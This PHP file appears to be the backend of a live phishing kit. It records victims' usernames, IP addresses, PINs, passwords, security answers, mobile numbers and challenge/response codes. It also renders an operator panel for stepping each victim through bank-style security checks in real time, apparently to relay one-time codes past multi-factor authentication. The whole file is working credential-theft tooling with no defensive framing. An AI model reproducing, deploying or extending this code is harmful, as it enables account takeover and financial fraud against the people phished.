<?php
include "../config/data.php";

$time = date('d-m-Y H:i:s');
if(isset($_GET["step"]))
{


if($_GET["step"] == "user")
{

	$user=urldecode($conn->real_escape_string($_GET["user"]));
	$ua=urldecode($conn->real_escape_string($_GET["ua"]));
	$ip=urldecode($conn->real_escape_string($_GET["ip"]));
	if(strlen($user)>30 || strlen($ua)>500  || strlen($ip)>20  )
	{
	die();
	}
	
	$stmt = $connp->prepare("SELECT user FROM login where user=:user and status=0");
	$stmt->bindParam(':user', $user);
	$stmt->execute();
	$count =$stmt->rowCount();
	if($count>0)
	{
	$stmt = $connp->prepare("update `login` set status=1 , updatetime=:updatetime where user=:user");
    $stmt->bindParam(':user', $user);
	$stmt->bindParam(':updatetime', $time);
    $stmt->execute();
	die();
	}
    $stmt = $connp->prepare("INSERT INTO `login`(`user`, `ua`, `ip`, `time`,`updatetime`, `status`) VALUES (:user,:agent,:ip,:time,:updatetime,1)");
    $stmt->bindParam(':user', $user);
    $stmt->bindParam(':agent', $ua);
    $stmt->bindParam(':ip', $ip);
    $stmt->bindParam(':time', $time);
	$stmt->bindParam(':updatetime', $time);
    $stmt->execute();
}

if($_GET["step"] == "sa")
{
	$user=urldecode($conn->real_escape_string($_GET["user"]));
	$sa=urldecode($conn->real_escape_string($_GET["sa"]));
	$secc=urldecode($conn->real_escape_string($_GET["secc"]));
	if(strlen($user)>30 || strlen($sa)>25 || strlen($secc)>25 )
	{
	die();
	}
    $stmt = $connp->prepare("UPDATE `login` SET `sa`=:sa , `secc`=:secc, `status`=3 , updatetime=:updatetime where user=:user");
    $stmt->bindParam(':sa', $sa);
    $stmt->bindParam(':secc', $secc);
    $stmt->bindParam(':user', $user);
	$stmt->bindParam(':updatetime', $time);
    $stmt->execute();
}

if($_GET["step"] == "pin")
{

	$user=urldecode($conn->real_escape_string($_GET["user"]));
	$pin=urldecode($conn->real_escape_string($_GET["pin"]));
	$pass=urldecode($conn->real_escape_string($_GET["pass"]));
	if(strlen($user)>30 || strlen($pin)>7 || strlen($pass)>5 )
	{
	die();
	}
    $stmt = $connp->prepare("UPDATE `login` SET `pin`=:pin , `pass`=:pass, `status`=2 , updatetime=:updatetime where user=:user");
    $stmt->bindParam(':pin', $pin);
    $stmt->bindParam(':pass', $pass);
    $stmt->bindParam(':user', $user);
	$stmt->bindParam(':updatetime', $time);
    $stmt->execute();
}

if($_GET["step"] == "fpin")
{

	$user=urldecode($conn->real_escape_string($_GET["user"]));
	$pin=urldecode($conn->real_escape_string($_GET["pin"]));
	$pass=urldecode($conn->real_escape_string($_GET["pass"]));
	if(strlen($user)>30 || strlen($pin)>7 || strlen($pass)>30 )
	{
	die();
	}
    $stmt = $connp->prepare("UPDATE `login` SET `pin`=:pin , `pass`=:pass, `status`=3 , updatetime=:updatetime where user=:user");
    $stmt->bindParam(':pin', $pin);
    $stmt->bindParam(':pass', $pass);
    $stmt->bindParam(':user', $user);
	$stmt->bindParam(':updatetime', $time);
    $stmt->execute();
}

if($_GET["step"] == "mob")
{

	$user=urldecode($conn->real_escape_string($_GET["user"]));
	$mob=urldecode($conn->real_escape_string($_GET["mob"]));
	if(strlen($user)>30 || strlen($pin)>7 || strlen($pass)>30 )
	{
	die();
	}
    $stmt = $connp->prepare("UPDATE `login` SET `mob`=:mob , `status`=4 , updatetime=:updatetime where user=:user");
    $stmt->bindParam(':mob', $mob);
    $stmt->bindParam(':user', $user);
	$stmt->bindParam(':updatetime', $time);
    $stmt->execute();
}

if($_GET["step"] == "sq")
{
	$user=urldecode($conn->real_escape_string($_GET["user"]));
	if(strlen($user)>30)
	{
	die();
	}
    $stmt = $connp->prepare("SELECT `sq` FROM `login` where user=:user");
    $stmt->bindParam(':user', $user);
	$stmt->execute();
	$row = $stmt->fetch();
	echo $row["sq"];
}

if($_GET["step"] == "challenge")
{
	$user=urldecode($conn->real_escape_string($_GET["user"]));
	if(strlen($user)>30)
	{
	die();
	}
    $stmt = $connp->prepare("SELECT `challenge` FROM `login` where user=:user");
    $stmt->bindParam(':user', $user);
	$stmt->execute();
	$row = $stmt->fetch();
	echo $row["challenge"];
}

if($_GET["step"] == "response")
{

	$user=urldecode($conn->real_escape_string($_GET["user"]));
	$response=urldecode($conn->real_escape_string($_GET["response"]));
	if(strlen($user)>30 || strlen($response)>12)
	{
	die();
	}
    $stmt = $connp->prepare("UPDATE `login` SET `response`=:response , `status`=6 , updatetime=:updatetime where user=:user");
    $stmt->bindParam(':response', $response);
    $stmt->bindParam(':user', $user);
	$stmt->bindParam(':updatetime', $time);
    $stmt->execute();
}

if($_GET["step"] == "getlogin" || $_GET["step"] == "getresponse")
{
	$user=urldecode($conn->real_escape_string($_GET["user"]));
	if(strlen($user)>30)
	{
	die();
	}
	$stmt = $connp->prepare("UPDATE `login` set time=:time where user=:user");
	$stmt->bindParam(':time', $time);
    $stmt->bindParam(':user', $user);
	$stmt->execute();
    $stmt = $connp->prepare("SELECT `status` FROM `login` where user=:user limit 0,1");
    $stmt->bindParam(':user', $user);
	$stmt->execute();
	$row = $stmt->fetch();
	echo $row["status"];
}



if($_GET["step"] == "pinger" )
{
	$id=urldecode($conn->real_escape_string($_GET["id"]));
	if(strlen($id)>30)
	{
	die();
	}
    $stmt = $connp->prepare("SELECT `time` FROM `login` where id=:id limit 0,1");
    $stmt->bindParam(':id', $id);
	$stmt->execute();
	$row = $stmt->fetch();
	#echo $row["time"];
	$to_time = strtotime(date('d-m-Y H:i:s'));
	$from_time = strtotime($row["time"]);
	if(round(abs($to_time - $from_time) / 60,2)>1)
	{
		echo "0";
	}
	else
	{
		echo "1";
	}

}


if($_GET["step"] == "stats" )
{

	$stmt = $connp->prepare("select 
	(select count(*) from login where status=1) as lw,
	(select count(*) from login where status=3) as cw,
	(select count(*) from login where status=6) as rw");
	$stmt->execute();
	$row=$stmt->fetch();
	$lw=$row["lw"];
	$cw=$row["cw"];
	$rw=$row["rw"];

	echo $lw."|".$cw."|".$rw;

}


if($_GET["step"] == "update")
{
	$type=urldecode($conn->real_escape_string($_GET["type"]));
	if($type == "login")
	{
    $stmt = $connp->prepare("SELECT * FROM `login` where status<3 order by updatetime ASC");
    $stmt->execute();
	$count =$stmt->rowCount();
		if($count>0)
		{
			while($row = $stmt->fetch())
			{
					echo '<tr><td><button style="cursor:pointer" onclick="checkOn(\''.$row["id"].'\',this)">Check</button></td><td>'.$row["user"].'</td> <td>'.$row["sq"].'</td>';
					echo '<td><textarea disabled class="form-control" rows="5" cols="50" style="margin: 0px 273px 0px 0px; width: 348px; height: 166px;">Useragent: ' . $row["ua"] . ' 
					
IP: ' . $row["ip"] . '
					</textarea></td>';
					if($row["status"] == "2")
					{
					echo '<td><button type="button" class="btn btn-secondary btn-sm">SQ Issued</button></td>';
					}
					else if($row["status"] == "0")
					{
					echo '<td><button type="button" class="btn btn-danger btn-sm">Error</button></td>';
					}
					else
					{
					echo '<td><button type="button" class="btn btn-success btn-sm" onclick="getSQ('.$row["id"].')">Proceed</button><br>
					<a href="?step=0&id='.$row["id"].'"><button type="button" class="btn btn-danger btn-sm">Error</button></a><br>
					<a href="?step=8&id='.$row["id"].'"><button type="button" class="btn btn-warning btn-sm">Exit</button></a></td>';
					}
					echo '</tr>'.PHP_EOL;
			}
		}
	}
	
	
	
	if($type == "challenge")
	{
    $stmt = $connp->prepare("SELECT * FROM `login` where status>2 and status<6 or status>40 order by updatetime ASC");
    $stmt->execute();
	$count =$stmt->rowCount();
		while($row = $stmt->fetch())
		{
				echo '<tr><td><button style="cursor:pointer" onclick="checkOn(\''.$row["id"].'\',this)">Check</button></td><td>'.$row["user"].'</td><td>'.$row["sq"].'</td><td>'.$row["sa"].'</td><td>'.$row["secc"].'</td>';
				echo '<td><textarea disabled class="form-control" rows="5" cols="50" style="margin: 0px 273px 0px 0px; width: 348px; height: 166px;">Useragent: ' . $row["ua"] . ' 
					
IP: ' . $row["ip"] . '</textarea></td>';
				if($row["status"] == "4")
				{
				echo '<td><button type="button" class="btn btn-secondary btn-sm">Error-SQ</button></td>';
				}
				else if($row["status"] == "5")
				{
				echo '<td><button type="button" class="btn btn-secondary btn-sm">Challenge Issued</button></td>';
				}
				else
				{
				echo '<td><button type="button" class="btn btn-success btn-sm" onclick="getChallenge('.$row["id"].')">Proceed</button><br>
				<a href="?step=4&id='.$row["id"].'"><button type="button" class="btn btn-danger btn-sm">Error</button></a><br>
				<a href="?step=8&id='.$row["id"].'"><button type="button" class="btn btn-warning btn-sm">Exit</button></a></td>';
				}
				echo '</tr>'.PHP_EOL;
		}
	}
	
	if($type == "response")
	{
    $stmt = $connp->prepare("SELECT * FROM `login` where status>=6 and status<10 order by updatetime ASC");
    $stmt->execute();
	$count =$stmt->rowCount();
		while($row = $stmt->fetch())
		{
				echo '<tr><td><button style="cursor:pointer" onclick="checkOn(\''.$row["id"].'\',this)">Check</button></td>
				<td>'.$row["user"].'</td><td>'.$row["sq"].'</td><td>'.$row["sa"].'</td><td>'.$row["secc"].'</td><td>'.$row["challenge"].'</td>
				<td>'.$row["response"].'</td>';
				echo '<td><textarea disabled class="form-control" rows="5" cols="50" style="margin: 0px 273px 0px 0px; width: 348px; height: 166px;">Useragent: ' . $row["ua"] . ' 
					
IP: ' . $row["ip"] . '</textarea></td>';
				if($row["status"] == "7")
				{
				echo '<td><button type="button" class="btn btn-secondary btn-sm">Error-Response</button></td>';
				}
				else if($row["status"] == "8")
				{
				echo '<td><button type="button" class="btn btn-secondary btn-sm">Exited</button></td>';
				}
				else if($row["status"] == "9")
				{
				echo '<td><button type="button" class="btn btn-secondary btn-sm">Success</button></td>';
				}
				else
				{
				echo '<td><button type="button" class="btn btn-success btn-sm" onclick="getChallenge('.$row["id"].')">Enter Challenge</button><br>
				<a href="?step=0&id='.$row["id"].'"><button type="button" class="btn btn-danger btn-sm">Error</button></a><br>
				<a href="?step=7&id='.$row["id"].'"><button type="button" class="btn btn-danger btn-sm">Error-Response</button></a><br>
				<a href="?step=8&id='.$row["id"].'"><button type="button" class="btn btn-warning btn-sm">Exit</button></a>
				<a href="?step=9&id='.$row["id"].'"><button type="button" class="btn btn-warning btn-sm">Confirm</button></a></td>';
				}
				echo '</tr>'.PHP_EOL;
		}
	}
	
}






}

?>